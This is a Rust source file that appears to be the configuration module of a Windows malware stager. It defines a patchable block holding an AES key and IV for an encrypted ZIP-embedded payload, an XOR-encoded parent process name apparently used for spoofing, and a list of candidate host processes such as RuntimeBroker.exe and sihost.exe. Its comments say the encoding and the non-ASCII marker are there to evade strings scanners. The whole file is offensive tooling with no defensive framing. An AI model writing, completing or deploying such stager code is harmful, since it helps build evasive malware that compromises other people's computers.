// config.rs
// STAGER_CONFIG is a static block with a binary magic header (non-ASCII so
// it does not surface in strings scans).  At compile time the body is
// placeholder bytes; build.py locates the magic and patches in key, iv,
// ppid_proc, and candidates.
//
// ppid_proc and candidates are XOR-encoded by the patcher (see build.py)
// so that no plaintext process names appear in .data.  They are decoded
// into short stack buffers at use-time.
//
// candidates is a null-separated, double-null terminated list *before*
// XOR encoding, e.g. "RuntimeBroker.exe\0sihost.exe\0...\0\0".

// STR_KEY — XOR key used for config obfuscation. Must match main.rs.
const STR_KEY: u8 = 0x37;

#[repr(C)]
pub struct StagerConfig {
    pub magic:      [u8; 9],    // random binary marker — patcher locates this
    pub key:        [u8; 32],   // AES-256 key for ZIP-embedded payload  (patched)
    pub iv:         [u8; 16],   // AES-CBC IV                            (patched)
    pub ppid_proc:  [u8; 64],   // XOR-encoded process name               (patched)
    pub candidates: [u8; 512],  // XOR-encoded candidate list             (patched)
}

// Non-zero placeholders ensure the block lands in .data (not .bss)
// so it is present as-is in the compiled PE.
// Magic: 9 random bytes — unique enough to locate by byte search, not an
// ASCII word so strings scanners do not flag it.
#[no_mangle]
pub static mut STAGER_CONFIG: StagerConfig = StagerConfig {
    magic:      [0xC1, 0x94, 0x3E, 0xA7, 0x6B, 0x0D, 0xF2, 0x58, 0x22],
    key:        [b'K'; 32],
    iv:         [b'I'; 16],
    ppid_proc:  [b'P'; 64],
    candidates: [b'C'; 512],
};

impl StagerConfig {
    pub fn key(&self) -> &[u8; 32] { &self.key }
    pub fn iv(&self)  -> &[u8; 16] { &self.iv }

    /// Returns an iterator over candidate process names, XOR-decoding
    /// each entry into a short owned String.
    pub fn candidate_names(&self) -> CandidateIter<'_> {
        CandidateIter { blob: &self.candidates, pos: 0 }
    }
}

pub struct CandidateIter<'a> {
    blob: &'a [u8],
    pos:  usize,
}

impl<'a> Iterator for CandidateIter<'a> {
    type Item = String;
    fn next(&mut self) -> Option<Self::Item> {
        // Terminator rule (post-decode): a zero byte ends iteration.
        // Since STR_KEY ^ 0x00 = STR_KEY, scan for STR_KEY to find entry boundaries.
        if self.pos >= self.blob.len() || self.blob[self.pos] == STR_KEY {
            return None;
        }
        let start = self.pos;
        let end = self.blob[start..]
            .iter()
            .position(|&b| b == STR_KEY)
            .map(|p| start + p)
            .unwrap_or(self.blob.len());
        self.pos = end + 1;
        let decoded: Vec<u8> = self.blob[start..end].iter().map(|b| b ^ STR_KEY).collect();
        match String::from_utf8(decoded) {
            Ok(s) if !s.is_empty() => Some(s),
            _ => None,
        }
    }
}
